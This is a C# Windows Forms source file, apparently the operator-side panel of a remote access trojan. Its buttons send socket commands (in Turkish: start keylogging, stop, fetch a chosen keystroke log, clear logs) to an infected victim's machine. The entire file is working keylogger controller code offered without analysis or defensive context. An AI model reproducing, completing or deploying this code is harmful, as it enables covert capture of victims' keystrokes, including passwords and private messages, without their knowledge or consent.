using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Keylogger : Form
    {
        Socket sock;
        public string ID = "";
        public Keylogger(Socket s, string uniq)
        {
            InitializeComponent();
            ID = uniq;
            sock = s;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try { 
            sock.Send(Encoding.UTF8.GetBytes("KEYBASLAT|"), SocketFlags.None);
            button1.Enabled = false; button2.Enabled = true;
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try { 
            sock.Send(Encoding.UTF8.GetBytes("KEYDUR|"), SocketFlags.None);
            button1.Enabled = true; button2.Enabled = false;
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()))
            {
                try { 
                sock.Send(Encoding.UTF8.GetBytes("KEYCEK|" + comboBox1.SelectedItem.ToString()), SocketFlags.None);
                }
                catch (Exception) { }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                sock.Send(Encoding.UTF8.GetBytes("LOGTEMIZLE|"), SocketFlags.None);
                comboBox1.Items.Clear();
            }
            catch (Exception) { }
        }
    }
}
